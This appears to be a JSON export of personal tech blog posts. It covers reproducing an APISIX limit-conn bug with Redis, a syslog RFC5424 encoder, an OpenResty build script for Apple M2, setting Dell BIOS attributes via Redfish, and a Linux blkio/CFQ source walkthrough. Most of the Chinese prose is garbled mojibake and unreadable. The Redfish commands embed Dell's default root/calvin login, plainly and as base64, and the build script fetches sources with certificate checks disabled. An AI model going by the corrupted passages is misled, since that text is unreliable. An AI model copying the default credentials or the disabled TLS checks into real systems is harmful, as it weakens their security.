[{"title":"limit-conn report error attribute does not exist","path":"/2023/07/10/reproduce-apisix-bug-9661/","content":"https://github.com/apache/apisix/pull/9663/files install dependsredisinstall redis and start the redis service 12345678910$ sudo apt install redis 100 [09:23:03][sudo] password for guohao:Reading package lists... DoneBuilding dependency tree... DoneReading state information... Doneredis is already the newest version (5:6.0.16-1ubuntu1).The following package was automatically installed and is no longer required: openjdk-11-jreUse &#x27;sudo apt autoremove&#x27; to remove it.0 upgraded, 0 newly installed, 0 to remove and 17 not upgraded. test the redis 12345$ redis-cli -h localhostlocalhost:6379&gt; set a testOKlocalhost:6379&gt; get a&quot;test&quot; enable APISIX stream proxyupdate the conf/config-default.yaml 123456789101112131415161718192021222324252627282930313233343536diff --git a/conf/config-default.yaml b/conf/config-default.yamlindex e40dc174..3d8dd4c4 100755--- a/conf/config-default.yaml+++ b/conf/config-default.yaml@@ -73,15 +73,15 @@ apisix: # radixtree_uri_with_parameter: similar to radixtree_uri but match URI with parameters. See https://github.com/api7/lua-resty-radixtree/#parameters-in-path for more details. ssl: radixtree_sni # radixtree_sni: match route by SNI- # stream_proxy: # TCP/UDP L4 proxy- # only: true # Enable L4 proxy only without L7 proxy.- # tcp:- # - addr: 9100 # Set the TCP proxy listening ports.- # tls: true- # - addr: &quot;127.0.0.1:9101&quot;- # udp: # Set the UDP proxy listening ports.- # - 9200- # - &quot;127.0.0.1:9201&quot;+ stream_proxy: # TCP/UDP L4 proxy+ only: true # Enable L4 proxy only without L7 proxy.+ tcp:+ - addr: 9100 # Set the TCP proxy listening ports.+ tls: true+ - addr: &quot;127.0.0.1:9101&quot;+ udp: # Set the UDP proxy listening ports.+ - 9200+ - &quot;127.0.0.1:9201&quot; # dns_resolver: # If not set, read from `/etc/resolv.conf` # - 1.1.1.1@@ -141,7 +141,7 @@ nginx_config: # Config for render the template to generate n # user: root # Set the execution user of the worker process. This is only # effective if the master process runs with super-user privileges. error_log: logs/error.log # Location of the error log.- error_log_level: warn # Logging level: info, debug, notice, warn, error, crit, alert, or emerg.+ error_log_level: debug # Logging level: info, debug, notice, warn, error, crit, alert, or emerg. worker_processes: auto # Automatically determine the optimal number of worker processes based create proxycreate a proxy and enable the limit-conn plugin with conn 1. 1234567891011121314151617181920curl http://127.0.0.1:9180/apisix/admin/stream_routes/1 -H &#x27;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#x27; -X PUT -d &#x27;&#123; &quot;plugins&quot;: &#123; &quot;limit-conn&quot;: &#123; &quot;conn&quot;: 5, &quot;burst&quot;: 0, &quot;default_conn_delay&quot;: 0.1, &quot;rejected_code&quot;: 503, &quot;key_type&quot;: &quot;var&quot;, &quot;key&quot;: &quot;remote_addr&quot; &#125; &#125;, &quot;upstream&quot;: &#123; &quot;type&quot;: &quot;none&quot;, &quot;nodes&quot;: &#123; &quot;127.0.0.1:6379&quot;: 1 &#125; &#125;&#125;&#x27; reload the APISIX instance 123456$ make reload [09:24:37][ info ] reload -&gt; [ Start ]/home/guohao/apisix/bin/apisix reload/usr/local/openresty//luajit/bin/luajit ./apisix/cli/apisix.lua reloadWarning! Current maximum number of open file descriptors [1024] is not greater than 1024, please increase user limits by execute &#x27;ulimit -n &lt;new user limits&gt;&#x27; , otherwise the performance is low.[ info ] reload -&gt; [ Done ] test the proxytest the stream proxy 123456789$ 2023/07/10 18:35:08 [info] 40958#1379024: *542041 [lua] timers.lua:39: run timer[plugin#server-info], context: ngx.timer2023/07/10 18:35:08 [info] 40956#1379020: *541986 client disconnected, bytes from/to client:47/171634, bytes from/to upstream:171634/472023/07/10 18:35:08 [info] 40956#1379020: *541986 stream [lua] init.lua:1114: stream_log_phase(): enter stream_log_phase while proxying connection, client: 127.0.0.1, server: 127.0.0.1:9101, upstream: &quot;127.0.0.1:6379&quot;, bytes from/to client:47/171634, bytes from/to upstream:171634/02023/07/10 18:35:08 [debug] 40956#1379020: *541986 stream [lua] init.lua:125: phase_func(): request latency is nil2023/07/10 18:35:09 [info] 40958#1379024: *542073 [lua] timers.lua:39: run timer[plugin#server-info], context: ngx.timer [09:24:53]localhost:9101&gt; set key testOKlocalhost:9101&gt; get key&quot;test&quot; canâ€™t reproduce the error log. 1234...2023/07/10 09:26:19 [info] 6971#6971: *242376 stream [lua] init.lua:1114: stream_log_phase(): enter stream_log_phase while proxying connection, client: 127.0.0.1, server: 127.0.0.1:9101, upstream: &quot;127.0.0.1:6379&quot;, bytes from/to client:117/18626, bytes from/to upstream:18626/02023/07/10 09:26:19 [debug] 6971#6971: *242376 stream [lua] init.lua:125: phase_func(): request latency is nil... update the config-default.yaml again. 1234567-# xrpc:-# protocols:-# - name: pingpong+xrpc:+ protocols:+ - name: redis+ and create a router again 1234567891011121314151617181920212223$ curl http://127.0.0.1:9180/apisix/admin/stream_routes/1 -H &#x27;X-API-KEY: edd1c9f034335f136f87ad84b625c8f1&#x27; -X PUT -d &#x27;&#123; &quot;plugins&quot;: &#123; &quot;limit-conn&quot;: &#123; &quot;conn&quot;: 5, &quot;burst&quot;: 0, &quot;default_conn_delay&quot;: 0.1, &quot;rejected_code&quot;: 503, &quot;key_type&quot;: &quot;var&quot;, &quot;key&quot;: &quot;remote_addr&quot; &#125; &#125;, &quot;upstream&quot;: &#123; &quot;type&quot;: &quot;none&quot;, &quot;nodes&quot;: &#123; &quot;127.0.0.1:6379&quot;: 1 &#125; &#125;, &quot;protocol&quot;: &#123; &quot;name&quot;: &quot;redis&quot; &#125;&#125;&#x27; and the log error 12345678...2023/07/10 18:30:34 [error] 40018#1373140: *526473 failed to run log_by_lua*: ...ohao/workspace/apisix/apisix/plugins/limit-conn/init.lua:122: attempt to perform arithmetic on field &#x27;request_time&#x27; (a nil value)stack traceback:\t...ohao/workspace/apisix/apisix/plugins/limit-conn/init.lua:122: in function &#x27;phase_func&#x27;\t/Users/guohao/workspace/apisix/apisix/plugin.lua:1134: in function &#x27;run_plugin&#x27;\t/Users/guohao/workspace/apisix/apisix/init.lua:1116: in function &#x27;stream_log_phase&#x27;\tlog_by_lua(nginx.conf:113):2: in main chunk while prereading client data, client: 127.0.0.1, server: 127.0.0.1:91012023/07/10 18:30:35 [info] 40020#1373151: *526570 [lua] timers.lua:39: run timer[plugin#server-info], context: ngx.timer At present, the reason for the two differences is unknown, and it takes time to look at the code.","tags":["lua"]},{"title":"syslog data format","path":"/2023/05/11/syslog-data-format/","content":"æœ€è¿‘åœ¨å­¦ä¹ ä¸€ä¸‹ apisix, å‘ç°ä»–çš„æ—¥å¿—æ’ä»¶å¾ˆä¹…å¾ˆç„å­¦ï¼Œçœ‹ä¸Šå»ä¸å·¥ä½œã€‚æµ‹è¯•ä¸€ä¸‹å‘ç°æœçœŸæ˜¯è¿™æ ·çš„ã€‚ debugç„¶åå°±å¼€å§‹ debug äº†ï¼Œåˆ›å»ºäº†ä¸€ä¸ª issues : syslog plugin looks doesnâ€™t work æœ‰ä¸ªç¤¾åŒºè€å“¥å¾ˆçƒ­å¿ƒï¼Œç¬¬äºŒå¤©å°±ç»™æˆ‘å‘äº† PR (å¥½äººå•ŠğŸ« ) Screenshot via Cisco å…³é”®ä»£ç ä»¥ä¸‹ä»£ç å‡å¤åˆ¶ä» apisix é¡¹ç›®ä¸­ã€‚ 12345678910111213141516171819function _M.encode(facility, severity, hostname, appname, pid, project, logstore, access_key_id, access_key_secret, msg) local pri = (Facility[facility] * 8 + Severity[severity]) local t = log_util.get_rfc3339_zulu_timestamp() if not hostname then hostname = &quot;-&quot; end if not appname then appname = &quot;-&quot; end return &quot;&lt;&quot; .. pri .. &quot;&gt;1 &quot; .. t .. &quot; &quot; .. hostname .. &quot; &quot; .. appname .. &quot; &quot; .. pid .. &quot; - [logservice project=\\&quot;&quot; .. project .. &quot;\\&quot; logstore=\\&quot;&quot; .. logstore .. &quot;\\&quot; access-key-id=\\&quot;&quot; .. access_key_id .. &quot;\\&quot; access-key-secret=\\&quot;&quot; .. access_key_secret .. &quot;\\&quot;] &quot; .. msg .. &quot; &quot;endreturn _M ä¸Šé¢ä»£ç å…¶å®å…¶å®ä¸å¤ªç¬¦åˆå®ƒçš„æ–‡ä»¶årfc5424.lua, é‡Œé¢æœ‰ä¸€äº›å¥‡æ€ªä»£ç ä¸œè¥¿æ²¡æœ‰å®šä¹‰åœ¨ rfc é‡Œé¢ã€‚ä¸è¿‡çƒ­å¿ƒè€å“¥çš„ pr é‡Œé¢ä¿®æ­£äº†ã€‚","tags":["lua"]},{"title":"how to build apisix@MacBookM2","path":"/2023/05/10/build-self-apisix/","content":"this script will download the deps of apisix, and build the new openresty to /usr/local/openresty 1brew install openresty-openssl111 go lua@5.1 pcre2 pcre compile the openrestythe new openresty will apply some patchs from apisix project, and it can runing at M2 machine. Dontâ€™t forget set the PATH var to keep the /usr/local/openresty/* path will find firstly. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199#!/usr/bin/env bashset -eversion=&quot;0.0.0&quot;OR_PREFIX=&quot;/usr/local/openresty&quot;lj_ver=&quot;2.1-20230119&quot;openresty_ver=&quot;1.21.4.1&quot;function install_openresty()&#123; rm -rf openresty-$&#123;openresty_ver&#125; if [ ! -f LuaJIT-$lj_ver.tar.gz ]; then wget &quot;https://github.com/openresty/luajit2/archive/v$lj_ver.tar.gz&quot; -O &quot;LuaJIT-$lj_ver.tar.gz&quot; fi tar -zxvf LuaJIT-$lj_ver.tar.gz &gt; /dev/null if [ ! -f openresty-$&#123;openresty_ver&#125;.tar.gz ]; then wget --no-check-certificate https://openresty.org/download/openresty-$&#123;openresty_ver&#125;.tar.gz fi tar -zxvpf openresty-$&#123;openresty_ver&#125;.tar.gz &gt; /dev/null rm -rf openresty-$&#123;openresty_ver&#125;/bundle/LuaJIT-$lj_ver mv luajit2-$lj_ver openresty-$&#123;openresty_ver&#125;/bundle/ return 0&#125;function clone_repo() &#123; local repos=( &quot;ngx_multi_upstream_module&quot; &quot;mod_dubbo&quot; &quot;apisix-nginx-module&quot; &quot;wasm-nginx-module&quot; &quot;lua-var-nginx-module&quot; &quot;grpc-client-nginx-module&quot; &quot;amesh&quot; ) echo &quot;cloning repos&quot; if [ &quot;$1&quot; == &quot;update&quot; ]; then for repo in &quot;$&#123;repos[@]&#125;&quot;; do if [ -d &quot;$repo&quot; ]; then echo &quot;updating $repo&quot; pushd &quot;$repo&quot; git pull popd else git clone &quot;https://github.com/api7/$repo.git&quot; || exit 1 fi done else for repo in &quot;$&#123;repos[@]&#125;&quot;; do if [ ! -d &quot;$repo&quot; ]; then git clone &quot;https://github.com/api7/$repo.git&quot; || exit 1 fi done fi return 0&#125;function patch_openresty() &#123; pushd ngx_multi_upstream_module || exit 1 ./patch.sh ../openresty-$&#123;openresty_ver&#125; popd pushd apisix-nginx-module/patch || exit 1 ./patch.sh ../../openresty-$&#123;openresty_ver&#125; popd return 0&#125;function build_openresty() &#123; pushd openresty-$&#123;openresty_ver&#125; || exit 1 luajit_xcflags=$&#123;luajit_xcflags:=&quot;-DLUAJIT_NUMMODE=2 -DLUAJIT_ENABLE_LUA52COMPAT&quot;&#125; grpc_engine_path=&quot;-DNGX_GRPC_CLI_ENGINE_PATH=$OR_PREFIX/libgrpc_engine.so -DNGX_HTTP_GRPC_CLI_ENGINE_PATH=$OR_PREFIX/libgrpc_engine.so&quot; cc_opt=$&#123;cc_opt:&quot;&quot;&#125; ld_opt=$&#123;ld_opt:&quot;&quot;&#125; ./configure --prefix=&quot;$OR_PREFIX&quot; \\ --with-cc-opt=&quot;-DAPISIX_BASE_VER=$version $grpc_engine_path -I/opt/homebrew/opt/openresty-openssl111/include $cc_opt&quot; \\ --with-ld-opt=&quot;-Wl,-rpath,$OR_PREFIX/wasmtime-c-api/lib -L/opt/homebrew/opt/openresty-openssl111/lib $ld_opt&quot; \\ --add-module=../mod_dubbo \\ --add-module=../ngx_multi_upstream_module \\ --add-module=../apisix-nginx-module \\ --add-module=../apisix-nginx-module/src/stream \\ --add-module=../apisix-nginx-module/src/meta \\ --add-module=../wasm-nginx-module \\ --add-module=../lua-var-nginx-module \\ --add-module=../grpc-client-nginx-module \\ --with-poll_module \\ --with-pcre-jit \\ --without-http_rds_json_module \\ --without-http_rds_csv_module \\ --without-lua_rds_parser \\ --with-stream \\ --with-stream_ssl_module \\ --with-stream_ssl_preread_module \\ --with-http_v2_module \\ --without-mail_pop3_module \\ --without-mail_imap_module \\ --without-mail_smtp_module \\ --with-http_stub_status_module \\ --with-http_realip_module \\ --with-http_addition_module \\ --with-http_auth_request_module \\ --with-http_secure_link_module \\ --with-http_random_index_module \\ --with-http_gzip_static_module \\ --with-http_sub_module \\ --with-http_dav_module \\ --with-http_flv_module \\ --with-http_mp4_module \\ --with-http_gunzip_module \\ --with-threads \\ --with-compat \\ --with-luajit-xcflags=&quot;$luajit_xcflags&quot; \\ $no_pool_patch \\ -j`nproc` make -j`nproc` sudo make install popd&#125;function install_wasmtime() &#123; pushd wasm-nginx-module || exit 1 if [ ! -d lib/ ]; then ./install-wasmtime.sh fi popd return 0&#125;function install_api7_module() &#123; if [ ! -d /usr/local/openresty/lualib/resty/apisix/stream/xrpc ]; then pushd apisix-nginx-module || exit 1 sudo OPENRESTY_PREFIX=&quot;$OR_PREFIX&quot; make install popd fi if [ ! -d /usr/local/openresty/wasmtime-c-api/ ]; then pushd wasm-nginx-module || exit 1 sudo OPENRESTY_PREFIX=&quot;$OR_PREFIX&quot; make install popd fi pushd grpc-client-nginx-module/grpc-engine/ go build -o libgrpc_engine.so -buildmode=c-shared main.go sudo install -m 664 ./libgrpc_engine.so /usr/local/openresty sudo install -m 664 ../lib/resty/*.lua /usr/local/openresty/lualib/resty/ popd&#125;function main() &#123; if [ $(type -P nproc) == &quot;&quot; ]; then echo &quot;need install nproc&quot; exit 1 fi case &quot;$1&quot; in &quot;install&quot;) echo &quot;new install for dev apisix&quot; if [ -d ./build-apisix-dev ]; then pushd ./build-apisix-dev else mkdir ./build-apisix-dev pushd ./build-apisix-dev fi clone_repo install_openresty install_wasmtime patch_openresty build_openresty install_api7_module popd ;; &quot;update&quot;) echo &quot;only clone repo&quot; clone_repo update ;; *) echo &quot;only support install/repo&quot; exit 1 ;; esac&#125;main &quot;$@&quot; install apisixbefore to running apisix, you should install some packages by yourself. just clone the repo from apache/apisix 1234~/w/apisix *master&gt; git remote show origin* remote origin Fetch URL: git@github.com:apache/apisix.git Push URL: git@github.com:apache/apisix.git and try to make deps &amp;&amp; make run command.","tags":["k8s"]},{"title":"update BIOS attr by redfish","path":"/2022/09/03/update-bios-by-redfish/","content":"è¿™ä¸ª post æ¥è‡ªäºæ—©èµ·ä¸ºå¼€å‘è£¸é‡‘å±ç®¡ç†å¹³å°å’Œçš„æ ¸å¿ƒç»„å»ºä¹‹ä¸€çš„ bmc-server. bmc-server å…è®¸ä»¥ RESTful API çš„å½¢å¼å»æ“ä½œç‰©ç†æœºçš„å¸¦å¤–ç®¡ç†ã€‚ å…¶ä¸­æœ‰ä¸ªå…³é”®åŠŸèƒ½å°±æ˜¯æ”¯æŒç”¨æˆ·ä¿®æ”¹æœºå™¨çš„ BISO çš„ç†Ÿæ‚‰ï¼Œå…¶ POC å¦‚ä¸‹: DELL å‚å•†æ¡ˆä¾‹bios set request, å…¶ä¸­ç”¨æˆ·åå¯†ç å°±æ˜¯å‚å•†çš„é»˜è®¤é…ç½®ã€‚ 12redfishtool -u root -p calvin -r 192.168.156.16 raw PATCH /redfish/v1/Systems/System.Embedded.1/Bios/Settings -d &#x27;&#123;&quot;Attributes&quot;:&#123;&quot;SysProfile&quot;:&quot;PerfPerWattOptimizedOs&quot;,&quot;ProcPwrPerf&quot;:&quot;OsDbpm&quot;,&quot;ProcTurboMode&quot;:&quot;Enabled&quot;,&quot;MonitorMwait&quot;:&quot;Enabled&quot;&#125;,&quot;@Redfish.SettingsApplyTime&quot;:&#123;&quot;ApplyTime&quot;:&quot;OnReset&quot;&#125;&#125;&#x27;redfishtool -u root -p calvin -r 192.168.156.16 raw POST /redfish/v1/Systems/System.Embedded.1/Actions/ComputerSystem.Reset -d &#x27;&#123;&quot;ResetType&quot;:&quot;PowerCycle&quot;&#125;&#x27; ä¸Šé¢è¿™ä¸ªredfishtoolç­‰ä»·äºä¸‹é¢çš„ curl æŒ‡ä»¤ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051curl -X PATCH -k -v -H &quot;Authorization: Basic cm9vdDpjYWx2aW4=&quot; -H &quot;Accept: application/json&quot; -H &quot;Content-Type: application/json&quot; https://192.168.156.16/redfish/v1/Systems/System.Embedded.1/Bios/Settings -d &#x27;&#123;&quot;Attributes&quot;:&#123;&quot;SysProfile&quot;:&quot;PerfPerWattOptimizedOs&quot;,&quot;ProcPwrPerf&quot;:&quot;OsDbpm&quot;,&quot;ProcTurboMode&quot;:&quot;Enabled&quot;,&quot;MonitorMwait&quot;:&quot;Enabled&quot;&#125;&#125;&#x27;whoami: cannot find name for user ID 1007* Trying 192.168.156.16:443...* TCP_NODELAY set* Connected to 192.168.156.16 (192.168.156.16) port 443 (#0)* ALPN, offering h2* ALPN, offering http/1.1* successfully set certificate verify locations:* CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs* TLSv1.3 (OUT), TLS handshake, Client hello (1):* TLSv1.3 (IN), TLS handshake, Server hello (2):* TLSv1.2 (IN), TLS handshake, Certificate (11):* TLSv1.2 (IN), TLS handshake, Server key exchange (12):* TLSv1.2 (IN), TLS handshake, Server finished (14):* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):* TLSv1.2 (OUT), TLS handshake, Finished (20):* TLSv1.2 (IN), TLS handshake, Finished (20):* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384* ALPN, server accepted to use http/1.1* Server certificate:* subject: C=US; ST=Texas; L=Round Rock; O=Dell Inc.; OU=Remote Access Group; CN=idrac-SVCTAG; emailAddress=support@dell.com* start date: Oct 20 17:43:00 2021 GMT* expire date: Oct 21 17:43:00 2031 GMT* issuer: C=US; ST=Texas; L=Round Rock; O=Dell Inc.; OU=Remote Access Group; CN=idrac-SVCTAG; emailAddress=support@dell.com* SSL certificate verify result: self signed certificate (18), continuing anyway.&gt; PATCH /redfish/v1/Systems/System.Embedded.1/Bios/Settings HTTP/1.1&gt; Host: 192.168.156.16&gt; User-Agent: curl/7.68.0&gt; Authorization: Basic cm9vdDpjYWx2aW4=&gt; Accept: application/json&gt; Content-Type: application/json&gt; Content-Length: 128&gt;* upload completely sent off: 128 out of 128 bytes* Mark bundle as not supporting multiuse&lt; HTTP/1.1 200 OK&lt; Date: Thu, 28 Apr 2022 19:51:52 GMT&lt; Server: Apache&lt; OData-Version: 4.0&lt; Access-Control-Allow-Origin: *&lt; Cache-Control: no-cache&lt; X-Frame-Options: DENY&lt; Strict-Transport-Security: max-age=63072000; includeSubDomains; preload&lt; Content-Length: 1579&lt; Vary: Accept-Encoding&lt; Content-Type: application/json;odata.metadata=minimal;charset=utf-8&lt;&#123;&quot;error&quot;:&#123;&quot;@Message.ExtendedInfo&quot;:[&#123;&quot;Message&quot;:&quot;Unable to modify the attribute because the attribute is read-only and depends on other attributes.&quot;,&quot;MessageArgs&quot;:[&quot;MonitorMwait&quot;],&quot;MessageArgs@odata.count&quot;:1,&quot;MessageId&quot;:&quot;IDRAC.2.4.SYS410&quot;,&quot;RelatedProperties&quot;:[&quot;#/Attributes/MonitorMwait&quot;],&quot;RelatedProperties@odata.count&quot;:1,&quot;Resolution&quot;:&quot;Verify if the attribute has dependency on other attributes and retry the operation. To verify, view the attribute registry based on the type of resource.&quot;,&quot;Severity&quot;:&quot;Warning&quot;&#125;,&#123;&quot;Message&quot;:&quot;Unable to modify the attribute because the attribute is read-only and depends on other attributes.&quot;,&quot;MessageArgs&quot;:[&quot;ProcPwrPerf&quot;],&quot;MessageArgs@odata.count&quot;:1,&quot;MessageId&quot;:&quot;IDRAC.2.4.SYS410&quot;,&quot;RelatedProperties&quot;:[&quot;#/Attributes/ProcPwrPerf&quot;],&quot;RelatedProperties@odata.count&quot;:1,&quot;Resolution&quot;:&quot;Verify if the attribute has dependency on other attributes and retry the operation. To verify, view the attribute registry based on the type of resource.&quot;,&quot;Severity&quot;:&quot;Warning&quot;&#125;,&#123;&quot;Message&quot;:&quot;Unable to modify the attr* Connection #0 to host 192.168.156.16 left intactibute because the attribute is read-only and depends on other attributes.&quot;,&quot;MessageArgs&quot;:[&quot;ProcTurboMode&quot;],&quot;MessageArgs@odata.count&quot;:1,&quot;MessageId&quot;:&quot;IDRAC.2.4.SYS410&quot;,&quot;RelatedProperties&quot;:[&quot;#/Attributes/ProcTurboMode&quot;],&quot;RelatedProperties@odata.count&quot;:1,&quot;Resolution&quot;:&quot;Verify if the attribute has dependency on other attributes and retry the operation. To verify, view the attribute registry based on the type of resource.&quot;,&quot;Severity&quot;:&quot;Warning&quot;&#125;],&quot;code&quot;:&quot;Base.1.7.GeneralError&quot;,&quot;message&quot;:&quot;A general error has occurred. See ExtendedInfo for more information&quot;&#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950curl -k -v -H &quot;Authorization: Basic cm9vdDpjYWx2aW4=&quot; -H &quot;Accept: application/json&quot; -H &quot;Content-Type: application/json&quot; https://192.168.156.16/redfish/v1/Systems/System.Embedded.1/Bios/Settingswhoami: cannot find name for user ID 1007* Trying 192.168.156.16:443...* TCP_NODELAY set* Connected to 192.168.156.16 (192.168.156.16) port 443 (#0)* ALPN, offering h2* ALPN, offering http/1.1* successfully set certificate verify locations:* CAfile: /etc/ssl/certs/ca-certificates.crt CApath: /etc/ssl/certs* TLSv1.3 (OUT), TLS handshake, Client hello (1):* TLSv1.3 (IN), TLS handshake, Server hello (2):* TLSv1.2 (IN), TLS handshake, Certificate (11):* TLSv1.2 (IN), TLS handshake, Server key exchange (12):* TLSv1.2 (IN), TLS handshake, Server finished (14):* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):* TLSv1.2 (OUT), TLS handshake, Finished (20):* TLSv1.2 (IN), TLS handshake, Finished (20):* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384* ALPN, server accepted to use http/1.1* Server certificate:* subject: C=US; ST=Texas; L=Round Rock; O=Dell Inc.; OU=Remote Access Group; CN=idrac-SVCTAG; emailAddress=support@dell.com* start date: Oct 20 17:43:00 2021 GMT* expire date: Oct 21 17:43:00 2031 GMT* issuer: C=US; ST=Texas; L=Round Rock; O=Dell Inc.; OU=Remote Access Group; CN=idrac-SVCTAG; emailAddress=support@dell.com* SSL certificate verify result: self signed certificate (18), continuing anyway.&gt; GET /redfish/v1/Systems/System.Embedded.1/Bios/Settings HTTP/1.1&gt; Host: 192.168.156.16&gt; User-Agent: curl/7.68.0&gt; Authorization: Basic cm9vdDpjYWx2aW4=&gt; Accept: application/json&gt; Content-Type: application/json&gt;* Mark bundle as not supporting multiuse&lt; HTTP/1.1 200 OK&lt; Date: Thu, 28 Apr 2022 19:48:10 GMT&lt; Server: Apache&lt; Link: &lt;/redfish/v1/Schemas/Bios.v1_1_0.json&gt;;rel=describedby&lt; Allow: GET,HEAD,PATCH&lt; OData-Version: 4.0&lt; Cache-Control: no-cache&lt; X-Frame-Options: DENY&lt; Strict-Transport-Security: max-age=63072000; includeSubDomains; preload&lt; Content-Length: 760&lt; Vary: Accept-Encoding&lt; Content-Type: application/json;odata.metadata=minimal;charset=utf-8&lt;* Connection #0 to host 192.168.156.16 left intact&#123;&quot;@odata.context&quot;:&quot;/redfish/v1/$metadata#Bios.Bios&quot;,&quot;@odata.id&quot;:&quot;/redfish/v1/Systems/System.Embedded.1/Bios/Settings&quot;,&quot;@odata.type&quot;:&quot;#Bios.v1_1_0.Bios&quot;,&quot;Id&quot;:&quot;Settings&quot;,&quot;Name&quot;:&quot;BIOS Configuration Pending Settings&quot;,&quot;Description&quot;:&quot;BIOS Configuration Pending Settings. These settings will be applied on next system reboot.&quot;,&quot;AttributeRegistry&quot;:&quot;BiosAttributeRegistry.v1_0_3&quot;,&quot;Attributes&quot;:&#123;&#125;,&quot;Actions&quot;:&#123;&quot;Oem&quot;:&#123;&quot;DellManager.v1_0_0#DellManager.ClearPending&quot;:&#123;&quot;target&quot;:&quot;/redfish/v1/Systems/System.Embedded.1/Bios/Settings/Actions/Oem/DellManager.ClearPending&quot;&#125;&#125;&#125;,&quot;Oem&quot;:&#123;&quot;Dell&quot;:&#123;&quot;@odata.context&quot;:&quot;/redfish/v1/$metadata#DellManager.DellManager&quot;,&quot;@odata.type&quot;:&quot;#DellManager.v1_1_0.DellManager&quot;,&quot;Jobs&quot;:&#123;&quot;@odata.id&quot;:&quot;/redfish/v1/Managers/iDRAC.Embedded.1/Oem/Dell/Jobs&quot;&#125;&#125;&#125;&#125; å¯¹åº”çš„ golang çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼š 123456789101112func (m *Manufacture) SetBIOSAttribute(attrs map[string]any) error &#123;\t_, err := m.Machine.Do(http.MethodPatch, &quot;/redfish/v1/Systems/System.Embedded.1/Bios/Settings&quot;, http.Header&#123;&#125;, map[string]any&#123; &quot;Attributes&quot;: attrs, &quot;@Redfish.SettingsApplyTime&quot;: map[string]any&#123;&quot;ApplyTime&quot;: &quot;OnReset&quot;&#125;,\t&#125;, nil)\tif err != nil &#123; log.Logger().Error(err.Error()) return err\t&#125;\treturn nil&#125;"},{"title":"blkio æºç åˆ†æ","path":"/2021/05/11/blk-io-2/","content":"èƒŒæ™¯ä¹‹å‰åœ¨å‘ç°çº¿ä¸Š blkio cgroup å±‚çº§å…³ç³»ä¸­ io_merged æ–‡ä»¶å†…å®¹ä¸ç¬¦åˆé¢„æœŸï¼Œæ‰€ä»¥æ‰æœ‰è¿™ä¸€ç¯‡æºç åˆ†æã€‚ 4.9 kernelåˆå§‹åŒ–æˆ‘ä»¬éƒ½çŸ¥é“ blkio æ˜¯åŸºäº IO çš„ scheduler çš„å®ç°çš„, åŸºäºçº¿ä¸Šçš„å”¯ä¸€çš„ä¸€å—SATAç›˜çš„ä¸”è°ƒåº¦ç®—æ³•æ˜¯ cfq, è¯»ä¸€ä¸‹ cfq å®ç° blkio çš„ç›¸å…³ä»£ç ,é¦–å…ˆåˆ° cfq çš„æ¨¡å—çš„å…¥å£å‡½æ•° cfq_init()ç§»é™¤äº†ä¸€äº›é”™è¯¯å¤„ç†ç›¸å…³çš„ä»£ç . 123456789101112131415161718192021static int __init cfq_init(void)&#123;\tint ret;#ifdef CONFIG_CFQ_GROUP_IOSCHED\tret = blkcg_policy_register(&amp;blkcg_policy_cfq); // å¦‚æœ CONFIG_CFQ_GROUP_IOSCHED , ä¹Ÿå°±æ˜¯å¯åŠ¨ blkio éœ€è¦çš„å†…æ ¸é€‰é¡¹, è¿™ä¸ªå˜é‡çš„ä½ç½®å°±æ˜¯\tif (ret) return ret;#else\tcfq_group_idle = 0;#endif\tret = -ENOMEM;\tcfq_pool = KMEM_CACHE(cfq_queue, 0); if (!cfq_pool) goto err_pol_unreg;\tret = elv_register(&amp;iosched_cfq); // ...å®ç°è°ƒåº¦ç®—æ³•çš„ callback func å³å¯\tif (ret) goto err_free_pool;... blkcg_policy_register(&amp;blkcg_policy_cfq) ä¸­çš„ blkcg_policy_cfq å˜é‡çš„åˆå§‹åŒ–å¦‚ä¸‹. å…¶ä¸­çš„ cfq_blkcg_legacy_files å°±æ˜¯éœ€è¦ç‰¹åˆ«å…³æ³¨ç‚¹çš„ä»–åœ¨ç”¨æˆ·æ€ä»¥æ–‡ä»¶å½¢å¼ä½“ç°å‡ºæ¥. 1234567891011121314151617#ifdef CONFIG_CFQ_GROUP_IOSCHEDstatic struct blkcg_policy blkcg_policy_cfq = &#123;\t.dfl_cftypes = cfq_blkcg_files, // è¿™é‡Œå˜é‡æ˜¯ä¸ªåªæœ‰åªæœ‰ä¸€ä¸ª .name = &quot;weight&quot;, .legacy_cftypes = cfq_blkcg_legacy_files, // è¿™äº›æ˜¯ä¸»è¦çš„ç”¨æˆ·æ€ blkio æ–‡ä»¶ .cpd_alloc_fn = cfq_cpd_alloc, // æœ‰ fn æ˜¯å›è°ƒå‡½æ•°, æ²¡æœ‰çš„å°±æ˜¯ç”¨æˆ·æ€æ–‡ä»¶\t.cpd_init_fn = cfq_cpd_init,\t.cpd_free_fn = cfq_cpd_free,\t.cpd_bind_fn = cfq_cpd_bind,\t.pd_alloc_fn = cfq_pd_alloc,\t.pd_init_fn = cfq_pd_init,\t.pd_offline_fn = cfq_pd_offline,\t.pd_free_fn = cfq_pd_free,\t.pd_reset_stats_fn\t= cfq_pd_reset_stats,&#125;;#endif å…¶å®æˆ‘ä»¬åœ¨ Linux ä¸­çœ‹çš„ blkio.io_merged å°±æ˜¯è¿™é‡Œçš„è¿™ä¸ªå˜é‡äº§ç”Ÿçš„, å…¶ä¸­ blkio æ˜¯ sub system åå­—. åœ¨ä¸‹é¢çš„ä»£ç ä¸­ä¼šæ‹¼å‡‘å‡º. 123456789static struct cftype cfq_blkcg_legacy_files[] = &#123;\t/* on root, weight is mapped to leaf_weight */...\t&#123; .name = &quot;io_merged&quot;, .private = offsetof(struct cfq_group, stats.merged), .seq_show = cfqg_print_rwstat,\t&#125;,... çœ‹ä¸€ä¸‹ blkio çš„ cg policy 